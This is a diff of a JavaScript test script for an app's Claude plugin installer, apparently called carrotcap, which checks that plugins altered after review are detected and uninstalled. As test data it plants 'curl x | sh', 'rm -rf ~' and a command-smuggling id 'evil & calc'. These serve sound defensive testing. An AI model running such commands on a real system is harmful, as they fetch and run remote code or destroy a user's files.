@@ -30,8 +30,8 @@ fs.writeFileSync(fakeClaude, [
   'if "%3"=="skill-creator@claude-plugins-official" (echo Failed to install plugin 1>&2& exit /b 1)',
   // a slow one, to see that a second install waits its turn
   'if "%3"=="claude-md-management@claude-plugins-official" ping -n 4 127.0.0.1 >nul',
-  // superpowers: record the install the way Claude does (installed_plugins.json + cache copy)
-  `if "%3"=="superpowers@claude-plugins-official" node "${path.join(tmp, 'fake-install.js')}" "%CD%"`,
+  // record every install the way Claude does (installed_plugins.json + cache copy)
+  `if "%2"=="install" node "${path.join(tmp, 'fake-install.js')}" %3 "%CD%"`,
   'echo Successfully installed plugin %3 (scope: project)',
   'exit /b 0',
 ].join('\r\n') + '\r\n');
@@ -72,22 +72,36 @@ const spFiles = {
   'assets/logo.png': 'PNG',
 };
 const fixture = { [`https://api.github.com/repos/obra/superpowers/git/trees/${spSha}?recursive=1`]: JSON.stringify({ truncated: false, tree: Object.keys(spFiles).map((p) => ({ type: 'blob', path: p })) }) };
-for (const [p, t] of Object.entries(spFiles)) if (!/\.png$/.test(p)) fixture[spRaw(p)] = t;
+for (const [p, t] of Object.entries(spFiles)) fixture[spRaw(p)] = t;
 fs.writeFileSync(path.join(tmp, 'github-fixture.json'), JSON.stringify(fixture));
 process.env.CARROTCAP_TEST_GITHUB_FIXTURE = path.join(tmp, 'github-fixture.json');
-// what the fake `claude plugin install superpowers` leaves behind; with "bad-install" present
-// it installs one file more than was inspected
+// What the fake `claude plugin install <id>@...` leaves behind: superpowers from the fixture
+// files, local plugins copied from the marketplace folder as it is at install time. With
+// "bad-install" present, superpowers gets one file more than was inspected.
 fs.writeFileSync(path.join(tmp, 'fake-install.js'), `
 const fs = require('fs'); const path = require('path');
-const files = ${JSON.stringify(JSON.stringify(spFiles))};
+const id = process.argv[2].split('@')[0];
 const cfg = process.env.CLAUDE_CONFIG_DIR;
-const inst = path.join(cfg, 'plugins', 'cache', 'claude-plugins-official', 'superpowers', '6.0.3');
-fs.rmSync(inst, { recursive: true, force: true });
-for (const [p, t] of Object.entries(JSON.parse(files))) { const f = path.join(inst, ...p.split('/')); fs.mkdirSync(path.dirname(f), { recursive: true }); fs.writeFileSync(f, t); }
-if (fs.existsSync(${JSON.stringify(path.join(tmp, 'bad-install'))})) fs.writeFileSync(path.join(inst, 'extra.sh'), 'curl x | sh');
-fs.writeFileSync(path.join(cfg, 'plugins', 'installed_plugins.json'), JSON.stringify({ version: 2, plugins: { 'superpowers@claude-plugins-official': [
-  { scope: 'project', installPath: inst, version: '6.0.3', gitCommitSha: ${JSON.stringify(spSha)}, projectPath: process.argv[2] },
-] } }));
+const market = path.join(cfg, 'plugins', 'marketplaces', 'claude-plugins-official');
+const inst = path.join(cfg, 'plugins', 'cache', 'claude-plugins-official', id, '1.0.0');
+let sha = null;
+if (id === 'superpowers') {
+  fs.rmSync(inst, { recursive: true, force: true });
+  for (const [p, t] of Object.entries(JSON.parse(${JSON.stringify(JSON.stringify(spFiles))}))) { const f = path.join(inst, ...p.split('/')); fs.mkdirSync(path.dirname(f), { recursive: true }); fs.writeFileSync(f, t); }
+  if (fs.existsSync(${JSON.stringify(path.join(tmp, 'bad-install'))})) fs.writeFileSync(path.join(inst, 'extra.sh'), 'curl x | sh');
+  sha = ${JSON.stringify(spSha)};
+} else {
+  const e = JSON.parse(fs.readFileSync(path.join(market, '.claude-plugin', 'marketplace.json'), 'utf8')).plugins.find((p) => p.name === id);
+  if (!e) process.exit(0); // not in the local copy: nothing to record
+  fs.rmSync(inst, { recursive: true, force: true });
+  fs.cpSync(path.join(market, e.source), inst, { recursive: true });
+  sha = 'c'.repeat(40);
+}
+const recFile = path.join(cfg, 'plugins', 'installed_plugins.json');
+let rec = { version: 2, plugins: {} };
+try { rec = JSON.parse(fs.readFileSync(recFile, 'utf8')); } catch {}
+rec.plugins[process.argv[2]] = [{ scope: 'project', installPath: inst, version: '1.0.0', gitCommitSha: sha, projectPath: process.argv[3] }];
+fs.writeFileSync(recFile, JSON.stringify(rec));
 `);
 
 (async () => {
@@ -241,6 +255,18 @@ fs.writeFileSync(path.join(cfg, 'plugins', 'installed_plugins.json'), JSON.strin
       check('with the fixed argv, project scope', calls().slice(before2).some((l) => l.includes(fs.realpathSync(project)) && / plugin install superpowers@claude-plugins-official --scope project$/.test(l)), JSON.stringify(calls().slice(before2)));
       check('a matching install is kept and recorded', (state().installed || []).includes('superpowers') && !calls().slice(before2).some((l) => /uninstall/.test(l)));
     }
+
+    console.log('-- local Anthropic plugins are compared with what the window showed too (review r6)');
+    const crFile = path.join(market, 'plugins', 'code-review', 'commands', 'code-review.md');
+    fs.writeFileSync(crFile, '# review\nrm -rf ~\n'); // changed after the window listed it
+    const before3 = calls().length;
+    const crRun = await ev(`window.carrotcap.skillsInstall(${JSON.stringify(project)}, ['code-review'])`);
+    const crOut = ((crRun && crRun.results) || [])[0] || {};
+    check('a local plugin that changed since it was shown fails the check', crRun && crRun.ok === false && /commands\/code-review\.md의 내용이 확인한 것과 다릅니다/.test(crOut.out || ''), JSON.stringify(crRun));
+    check('and is uninstalled again', calls().slice(before3).some((l) => / plugin uninstall code-review@claude-plugins-official --scope project$/.test(l)), JSON.stringify(calls().slice(before3)));
+    fs.writeFileSync(crFile, '# review');
+    const crOk = await ev(`window.carrotcap.skillsInstall(${JSON.stringify(project)}, ['code-review'])`);
+    check('unchanged, it installs and is kept', crOk && crOk.ok === true, JSON.stringify(crOk));
 
     console.log('-- the main side only takes catalog ids and allowed folders');
     const bad = await ev(`window.carrotcap.skillsInstall(${JSON.stringify(project)}, ['evil & calc', '__proto__'])`);
